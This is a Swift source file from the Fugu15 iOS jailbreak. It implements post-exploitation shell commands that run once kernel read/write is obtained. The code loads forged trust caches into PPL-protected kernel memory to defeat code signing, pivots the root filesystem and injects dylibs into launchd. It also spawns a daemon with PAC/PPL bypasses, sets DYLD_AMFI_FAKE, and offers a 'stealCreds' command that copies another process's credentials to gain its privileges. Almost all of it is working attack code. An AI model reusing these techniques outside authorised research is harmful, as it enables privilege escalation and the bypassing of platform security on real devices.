//
//  iDownloadCmds.swift
//  Fugu15
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import iDownload
import KernelPatchfinder
import KRW
import KRWC
import SwiftXPC
import PatchfinderUtils

let iDownloadCmds = [
    "help": iDownload_help,
    "autorun": iDownload_autorun,
    "tcload": iDownload_tcload,
    "bootstrap": iDownload_bootstrap,
    "uninstall": iDownload_uninstall,
    "cleanup": iDownload_cleanup,
    "stealCreds": iDownload_stealCreds,
    "env": iDownload_env,
    "chmod": iDownload_chmod,
    "stashd": iDownload_stashd,
    "rsc": iDownload_rsc,
    "rootfs": iDownload_rootfs,
    "doit": iDownload_doit,
    "userreboot": iDownload_userreboot
] as [String: iDownloadCmd]

func iDownload_help(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    try hndlr.sendline("tcload <path to TrustCache>: Load a TrustCache")
    try hndlr.sendline("bootstrap:                   Extract bootstrap.tar to /private/preboot/jb")
    try hndlr.sendline("uninstall:                   Remove Procursus, Sileo and /var/jb symlink")
    try hndlr.sendline("stealCreds <pid>:            Steal credentials from a process")
}

func iDownload_userreboot(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    //_ = try hndlr.exec("launchctl", args: ["reboot", "userspace"])
    _ = try hndlr.exec("launchctl", args: ["load", "/Library/LaunchDaemons/com.openssh.sshd.plist"])
    restoreRealCreds()
}

func pivot_root(new: String, old: String) throws -> UInt64 {
    guard let pivot_root_addr = KRW.patchfinder.pivot_root else {
        throw KRWError.patchfinderFailed(symbol: "pivot_root")
    }
    
    let bufferNew = try KRW.alloc(size: UInt64(new.count) + 1)
    let bufferOld = try KRW.alloc(size: UInt64(old.count) + 1)
    
    try KRW.kwrite(virt: bufferNew, data: new.data(using: .utf8)!)
    try KRW.kwrite(virt: bufferOld, data: old.data(using: .utf8)!)
    
    return try KRW.kcall(func: KRW.slide(virt: pivot_root_addr), a1: bufferNew, a2: bufferOld, a3: 0, a4: 0, a5: 0, a6: 0, a7: 0, a8: 0)
}

func iDownload_rootfs(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 6 {
        try hndlr.sendline("Usage: rootfs <app part> <lib part> <bin part> <etc part> <sbin part> <usr part>")
        return
    }
    
    try FileManager.default.createDirectory(atPath: "/private/var/mnt", withIntermediateDirectories: true)
    
    // Mount new tempfs
    let mp = "/private/var/mnt/Fugu15"
    mkdir(mp, 0o700)
    _ = try hndlr.exec("/sbin/mount_tmpfs", args: [mp])
    
    // Copy /usr/lib to it
    mkdir(mp + "/usr", 0o700)
    try FileManager.default.copyItem(atPath: "/usr/lib", toPath: mp + "/usr/lib")
    
    // Copy mnt_apfs
    mkdir(mp + "/bin", 0o700)
    try FileManager.default.copyItem(atPath: "/System/Library/Filesystems/apfs.fs/mount_apfs", toPath: mp + "/bin/mount_apfs")
    
    // Create private/var/mnt dir
    try FileManager.default.createDirectory(atPath: "/private/var/mnt/real", withIntermediateDirectories: true)
    try FileManager.default.createDirectory(atPath: mp + "/private/var/mnt/real", withIntermediateDirectories: true)
    
    // And dev
    mkdir(mp + "/dev", 0o700)
    
    // Switch rootfs
    _ = try pivot_root(new: mp, old: "private/var/mnt/real")
    
    func mount(volume: String, to mp: String) throws {
        var volume = volume
        if !volume.starts(with: "/dev/") {
            volume = "/dev/" + volume
        }
        
        _ = try hndlr.exec("/bin/mount_apfs", args: [volume, mp])
    }
    
    // Do mounts
    try mount(volume: args[0], to: "/private/var/mnt/real/Applications")
    try mount(volume: args[1], to: "/private/var/mnt/real/Library")
    try mount(volume: args[2], to: "/private/var/mnt/real/bin")
    try mount(volume: args[3], to: "/private/var/mnt/real/etc")
    try mount(volume: args[4], to: "/private/var/mnt/real/sbin")
    try mount(volume: args[5], to: "/private/var/mnt/real/usr")
    
    // Switch back
    _ = try pivot_root(new: "/private/var/mnt/real", old: "private/var/mnt/Fugu15")
    
    // Load dyld TrustCache
    try iDownload_tcload(hndlr, "tcload", ["/usr/.Fugu15/TrustCache"])
    
    // Done!
    try hndlr.sendline("OK")
}

func iDownload_rsc(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 1 {
        try hndlr.sendline("Usage: rsc <resource name>")
        return
    }
    
    let dst = "/private/preboot/\(args[0])"
    try? FileManager.default.removeItem(atPath: dst)
    try FileManager.default.copyItem(atPath: Bundle.main.bundlePath + "/\(args[0])", toPath: dst)
    chmod(dst, 700)
    
    try hndlr.sendline("OK")
}

func iDownload_doit(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    // Ensure dyld is patched
    try iDownload_rsc(hndlr, "rsc", ["MachOMerger"])
    try iDownload_rsc(hndlr, "rsc", ["libdyldhook.dylib"])
    try iDownload_rsc(hndlr, "rsc", ["ldid"])
    try iDownload_rsc(hndlr, "rsc", ["bootstrapFS"])
    
    _ = try hndlr.exec("/private/preboot/bootstrapFS", args: ["updateDyld"])
    
    if access("/dev/disk0s1s14", F_OK) == 0 {
        try iDownload_rootfs(hndlr, "rootfs", ["/dev/disk0s1s9", "/dev/disk0s1s10", "/dev/disk0s1s11", "/dev/disk0s1s12", "/dev/disk0s1s13", "/dev/disk0s1s14"])
    } else {
        try iDownload_rootfs(hndlr, "rootfs", ["/dev/disk0s1s8", "/dev/disk0s1s9", "/dev/disk0s1s10", "/dev/disk0s1s11", "/dev/disk0s1s12", "/dev/disk0s1s13"])
    }
    
    let FuFuGuGu = Bundle.main.bundleURL.appendingPathComponent("libFuFuGuGu.dylib").path
    let jbinjector = Bundle.main.bundleURL.appendingPathComponent("jbinjector.dylib").path
    let stashd = Bundle.main.bundleURL.appendingPathComponent("stashd").path
    let inject_criticald = Bundle.main.bundleURL.appendingPathComponent("inject_criticald").path
    
    try? FileManager.default.removeItem(atPath: "/usr/lib/libFuFuGuGu.dylib")
    try? FileManager.default.removeItem(atPath: "/usr/lib/jbinjector.dylib")
    try? FileManager.default.removeItem(atPath: "/usr/bin/stashd")
    try? FileManager.default.removeItem(atPath: "/usr/bin/inject_criticald")
    
    try FileManager.default.copyItem(atPath: FuFuGuGu, toPath: "/usr/lib/libFuFuGuGu.dylib")
    try FileManager.default.copyItem(atPath: jbinjector, toPath: "/usr/lib/jbinjector.dylib")
    try FileManager.default.copyItem(atPath: stashd, toPath: "/usr/bin/stashd")
    try FileManager.default.copyItem(atPath: inject_criticald, toPath: "/usr/bin/inject_criticald")
    
    withKernelCredentials {
        _ = chown("/usr/lib/libFuFuGuGu.dylib", 0, 0)
        _ = chown("/usr/lib/jbinjector.dylib", 0, 0)
        _ = chown("/usr/bin/stashd", 0, 0)
        _ = chown("/usr/bin/inject_criticald", 0, 0)
        
        _ = chmod("/usr/lib/libFuFuGuGu.dylib", 0o755)
        _ = chmod("/usr/lib/jbinjector.dylib", 0o755)
        _ = chmod("/usr/bin/stashd", 0o755)
        _ = chmod("/usr/bin/inject_criticald", 0o755)
    }
    
    try iDownload_stashd(hndlr, "stashd", [])
    _ = try hndlr.exec("/usr/bin/inject_criticald", args: ["1", "/usr/lib/libFuFuGuGu.dylib"])
    
    setenv("JBINJECTOR_NO_MEMPATCH", "1", 1)
    
    let hndl = dlopen("/usr/lib/jbinjector.dylib", RTLD_NOW)
    typealias ft = @convention(c) (_: UnsafePointer<CChar>) -> Int
    let f = unsafeBitCast(dlsym(hndl, "trustCDHashesForBinaryPathSimple"), to: ft.self)
    let res = f("/usr/bin/launchctl")
    _ = f("/usr/bin/dash")
    
    unsetenv("JBINJECTOR_NO_MEMPATCH")
    
    try hndlr.sendline("trustCDHashesForBinaryPathSimple returned \(res)")
    
    setenv("DYLD_INSERT_LIBRARIES", "/usr/lib/jbinjector.dylib", 1)
    setenv("DYLD_AMFI_FAKE", "0xFF", 1)
    
    try hndlr.sendline("OK")
}

func iDownload_stashd(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    let stashd = "/usr/bin/stashd"
    
    let cache = URL(fileURLWithPath: getKernelcacheDecompressedPath()!).deletingLastPathComponent().appendingPathComponent("pf.plist")
    try KRW.patchfinder.exportResults()!.write(to: cache)
    
    let cpu_ttep = try KRW.r64(virt: KRW.slide(virt: KRW.patchfinder.cpu_ttep!))
    
    let cArgs: [UnsafeMutablePointer<CChar>?] = try [
        strdup(stashd),
        strdup("launchedByFugu15"),
        strdup(String(KRW.kbase())),
        strdup(String(KRW.kslide())),
        strdup(String(PPL_MAP_ADDR)),
        strdup(String(cpu_ttep)),     // For easy virt-to-phys
        nil
    ]
    defer { for arg in cArgs { free(arg) } }
    
    var fileActions: posix_spawn_file_actions_t?
    posix_spawn_file_actions_init(&fileActions)
    posix_spawn_file_actions_adddup2(&fileActions, hndlr.socket.fileDescriptor, STDIN_FILENO)
    posix_spawn_file_actions_adddup2(&fileActions, hndlr.socket.fileDescriptor, STDOUT_FILENO)
    posix_spawn_file_actions_adddup2(&fileActions, hndlr.socket.fileDescriptor, STDERR_FILENO)
    
    var attr: posix_spawnattr_t?
    posix_spawnattr_init(&attr)
    posix_spawnattr_setflags(&attr, Int16(POSIX_SPAWN_START_SUSPENDED))
    
    var child: pid_t = 0
    let res = posix_spawn(&child, cArgs[0], &fileActions, &attr, cArgs, environ)
    guard res == 0 else {
        throw iDownloadError.custom("Failed to launch jailbreakd: \(res)")
    }
    
    guard try KRW.initPPLBypass(inProcess: child) else {
        kill(child, SIGKILL)
        throw iDownloadError.custom("Failed to init PPL r/w jailbreakd")
    }
    
    kill(child, SIGCONT)
    
    var servicePort: mach_port_t = 0
    while true {
        let kr = bootstrap_look_up(bootstrap_port, "jb-global-stashd", &servicePort)
        guard kr == KERN_SUCCESS else {
            guard kr == 1102 else {
                throw KRWError.customError(description: "bootstrap_look_up failed: \(kr)")
            }
            
            continue
        }
        
        break
    }
    
    // Init PAC bypass in process
    let pipe = XPCPipe(port: servicePort)
    let reply = pipe.send(message: ["action": "getThread"])
    guard let dict = reply as? XPCDict else {
        kill(child, SIGKILL)
        throw iDownloadError.custom("Invalid stashd reply")
    }
    
    guard dict["error"] as? UInt64 == 0 else {
        kill(child, SIGKILL)
        throw iDownloadError.custom("Failed to get stashd thread")
    }
    
    guard let th = dict["thread"] as? UInt64 else {
        kill(child, SIGKILL)
        throw iDownloadError.custom("Invalid stashd thread")
    }
    
    do {
        try KRW.initKCallInThread(thread: th)
    } catch let e {
        kill(child, SIGKILL)
        
        throw e
    }
    
    _ = pipe.send(message: ["action": "pacBypass2Stashd"])
    
    KRW.cleanup()
    
    try hndlr.sendline("OK")
}

func iDownload_chmod(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 2 {
        try hndlr.sendline("Usage: chmod <mode, octal> <file>")
        return
    }
    
    errno = 0
    
    let mode = strtoul(args[0], nil, 8)
    guard mode != 0 || errno == 0 else {
        try hndlr.sendline("Failed to process mode!")
        return
    }
    
    guard mode < UInt16.max else {
        try hndlr.sendline("Invalid mode!")
        return
    }
    
    let file = hndlr.resolve(path: args[1])
    guard chmod(file, mode_t(mode)) == 0 else {
        throw iDownloadError.custom("\(errno) (\(String(cString: strerror(errno))))")
    }
}

func iDownload_env(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    var current = environ
    while let env = current.pointee {
        try hndlr.sendline(String(cString: env))
        current += 1
    }
}

func iDownload_stealCreds(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 1 {
        try hndlr.sendline("Usage: stealCreds <pid>")
        return
    }
    
    guard let pid = hndlr.parseUInt32(args[0]) else {
        throw iDownloadError.custom("Bad PID!")
    }
    
    guard let other = try Proc(pid: pid_t(bitPattern: pid)) else {
        throw iDownloadError.custom("Failed to find proc!")
    }
    
    KRW.ourProc?.ucred = other.ucred
    
    try hndlr.sendline("OK")
}

func iDownload_cleanup(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    KRW.cleanup()
    try hndlr.sendline("Cleanup done, KRW is now unavailable!")
}

func iDownload_autorun(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    unsetenv("DYLD_LIBRARY_PATH")
    
    try iDownload_tcload(hndlr, "tcload", [Bundle.main.bundleURL.appendingPathComponent("Fugu15_test.tc").path])
    
    _ = try? hndlr.exec("/sbin/mount", args: ["-u", "/private/preboot"])
    
    if access("/private/preboot/jb/TrustCache", F_OK) == 0 {
        try iDownload_tcload(hndlr, "tcload", ["/private/preboot/jb/TrustCache"])
        
        if access("/var/jb/Applications/Sileo.app", F_OK) == 0 {
            _ = try? hndlr.exec("/var/jb/usr/bin/uicache", args: ["-p", "/var/jb/Applications/Sileo.app"])
        }
    }
    
    try iDownload_doit(hndlr, "doit", [])
    try iDownload_userreboot(hndlr, "userreboot", [])
}

func iDownload_tcload(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 1 {
        try hndlr.sendline("Usage: tcload <path to TrustCache>")
        return
    }
    
    guard let krw = hndlr.krw else {
        throw iDownloadError.custom("No KRW support!")
    }
    
    let tcPath = hndlr.resolve(path: args[0])
    guard let data = try? Data(contentsOf: URL(fileURLWithPath: tcPath)) else {
        throw iDownloadError.custom("Failed to read trust cache!")
    }
    
    // Make sure the trust cache is good
    guard data.count >= 0x18 else {
        throw iDownloadError.custom("Trust cache is too small!")
    }
    
    let vers = data.getGeneric(type: UInt32.self)
    guard vers == 1 else {
        throw iDownloadError.custom(String(format: "Trust cache has bad version (must be 1, is %u)!", vers))
    }
    
    let count = data.getGeneric(type: UInt32.self, offset: 0x14)
    guard data.count == 0x18 + (Int(count) * 22) else {
        throw iDownloadError.custom(String(format: "Trust cache has bad length (should be %p, is %p)!", 0x18 + (Int(count) * 22), data.count))
    }
    
    guard let pmap_image4_trust_caches = KernelPatchfinder.running!.pmap_image4_trust_caches else {
        throw iDownloadError.custom("Failed to patchfind pmap_image4_trust_caches!")
    }
    
    var mem: UInt64!
    do {
        mem = try krw.kalloc(size: UInt(data.count + 0x10))
    } catch let e {
        throw KRWError.customError(description: "Failed to allocate kernel memory for TrustCache: \(e)")
    }
    
    let next = KRWAddress(address: mem, options: [])
    let us   = KRWAddress(address: mem + 0x8, options: [])
    let tc   = KRWAddress(address: mem + 0x10, options: [])
    
    do {
        try krw.kwrite(address: us, data: Data(fromObject: mem + 0x10))
        try krw.kwrite(address: tc, data: data)
    } catch let e {
        throw KRWError.customError(description: "Failed to write to our TrustCache: \(e)")
    }
    
    let pitc = KRWAddress(address: pmap_image4_trust_caches + hndlr.slide, options: .PPL)
    
    // Read head
    guard let cur = krw.r64(pitc) else {
        throw KRWError.customError(description: "Failed to read TrustCache head!")
    }
    
    // Write into our list entry
    try krw.kwrite(address: next, data: Data(fromObject: cur))
    
    // Replace head
    try krw.kwrite(address: pitc, data: Data(fromObject: mem.unsafelyUnwrapped))
    
    try hndlr.sendline("Successfully loaded TrustCache!")
}

func iDownload_bootstrap(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    let bootstrap_tar = Bundle.main.bundleURL.appendingPathComponent("bootstrap.tar").path
    let tar           = Bundle.main.bundleURL.appendingPathComponent("tar").path
    let trustCache    = Bundle.main.bundleURL.appendingPathComponent("TrustCache").path
    let sileo         = Bundle.main.bundleURL.appendingPathComponent("sileo.deb").path
    
    guard access(bootstrap_tar, F_OK) == 0 else {
        throw iDownloadError.custom("bootstrap.tar does not exist!")
    }
    
    guard access(tar, F_OK) == 0 else {
        throw iDownloadError.custom("tar does not exist!")
    }
    
    guard access(trustCache, F_OK) == 0 else {
        throw iDownloadError.custom("TrustCache for tar does not exist!")
    }
    
    try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: tar)
    
    try hndlr.sendline("Re-Mounting /private/preboot...")
    do {
        let exit = try hndlr.exec("/sbin/mount", args: ["-u", "/private/preboot"])
        if exit != 0 {
            throw iDownloadError.custom("mount failed: exit status: \(exit)")
        }
    } catch iDownloadError.execError(status: let status) {
        throw iDownloadError.custom("Failed to exec mount: posix_spawn error \(status) (\(String(cString: strerror(status))))")
    } catch iDownloadError.childDied(signal: let signal) {
        throw iDownloadError.custom("mount died: Signal: \(signal)")
    }
    
    try hndlr.sendline("Loading tar TrustCache...")
    try iDownload_tcload(hndlr, "tcload", [trustCache])
    
    try hndlr.sendline("Creating bootstrap dir")
    try? FileManager.default.removeItem(atPath: "/private/preboot/jb")
    try FileManager.default.createDirectory(atPath: "/private/preboot/jb", withIntermediateDirectories: false, attributes: nil)
    
    try hndlr.sendline("Extracting bootstrap.tar...")
    do {
        _ = withKernelCredentials {
            chmod(tar, 0o755)
        }
        
        let exit = try hndlr.exec(tar, args: ["-xvf", bootstrap_tar], cwd: "/private/preboot/jb")
        if exit != 0 {
            throw iDownloadError.custom("tar failed: exit status: \(exit)")
        }
    } catch iDownloadError.execError(status: let status) {
        throw iDownloadError.custom("Failed to exec tar: posix_spawn error \(status) (\(String(cString: strerror(status))))")
    } catch iDownloadError.childDied(signal: let signal) {
        throw iDownloadError.custom("tar died: Signal: \(signal)")
    }
    
    if access("/private/preboot/jb/TrustCache", F_OK) == 0 {
        try hndlr.sendline("Loading bootstrap.tar TrustCache...")
        try iDownload_tcload(hndlr, "tcload", ["/private/preboot/jb/TrustCache"])
    }
    
    try hndlr.sendline("Creating /var/jb symlink...")
    try? FileManager.default.removeItem(atPath: "/var/jb")
    try? FileManager.default.createSymbolicLink(atPath: "/var/jb", withDestinationPath: "/private/preboot/jb")
    
    try hndlr.sendline("Running bootstrap.sh...")
    var status = try hndlr.exec("/var/jb/usr/bin/sh", args: ["/var/jb/prep_bootstrap.sh"])
    
    try hndlr.sendline("prep_bootstrap.sh: \(status)")
    
    if access(sileo, F_OK) == 0 {
        try hndlr.sendline("Installing Sileo...")
        status = try hndlr.exec("/var/jb/usr/bin/dpkg", args: ["-i", sileo])
        
        try hndlr.sendline("dpkg: \(status)")
        
        status = try hndlr.exec("/var/jb/usr/bin/uicache", args: ["-p", "/var/jb/Applications/Sileo.app"])
        
        try hndlr.sendline("uicache: \(status)")
    }
    
    try hndlr.sendline("Done")
}

func iDownload_uninstall(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if access("/var/jb/Applications/Sileo.app", F_OK) == 0 {
        try hndlr.sendline("Removing Sileo...")
        _ = try? hndlr.exec("/var/jb/usr/bin/uicache", args: ["-u", "/var/jb/Applications/Sileo.app"])
    }
    
    if access("/private/preboot/jb", F_OK) == 0 {
        try hndlr.sendline("Removing bootstrap...")
        try? FileManager.default.removeItem(atPath: "/private/preboot/jb")
    }
    
    try hndlr.sendline("Removing /var/jb symlink...")
    try? FileManager.default.removeItem(atPath: "/var/jb")
    
    try hndlr.sendline("Done")
}
